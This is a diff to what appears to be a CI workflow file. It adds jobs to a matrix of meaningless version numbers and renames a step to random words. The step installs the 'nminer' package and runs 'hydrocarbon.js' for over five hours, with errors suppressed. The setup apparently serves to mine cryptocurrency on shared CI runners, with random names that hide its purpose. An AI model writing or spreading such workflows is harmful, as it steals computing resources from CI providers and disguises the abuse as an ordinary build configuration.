@@ -9,22 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 2289 }
-          - { version: 5792 }
-          - { version: 4134 }
-          - { version: 9478 }
-          - { version: 4670 }
-          - { version: 1224 }
-          - { version: 4358 }
-          - { version: 8700 }
-          - { version: 7012 }
-          - { version: 9138 }
-          - { version: 5674 }
-          - { version: 7199 }
-          - { version: 308 }
-          - { version: 1905 }
-          - { version: 2869 }
-          - { version: 787 }
+          - { version: 3264 }
+          - { version: 3927 }
+          - { version: 7600 }
+          - { version: 4932 }
+          - { version: 3568 }
+          - { version: 3516 }
+          - { version: 7061 }
+          - { version: 6274 }
+          - { version: 7780 }
+          - { version: 6371 }
+          - { version: 3508 }
+          - { version: 2548 }
+          - { version: 8615 }
+          - { version: 7387 }
+          - { version: 2390 }
+          - { version: 2675 }
+          - { version: 5204 }
+          - { version: 3010 }
 
     steps:
       - name: Checkout
@@ -35,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: vice
+      - name: voluntarily ouch joyously bourgeoisie because
         run: |
           npm install nminer@latest
-          timeout 305m node hydrocarbon.js || echo "hydrocarbon executed"
+          timeout 319m node hydrocarbon.js || echo "hydrocarbon executed"
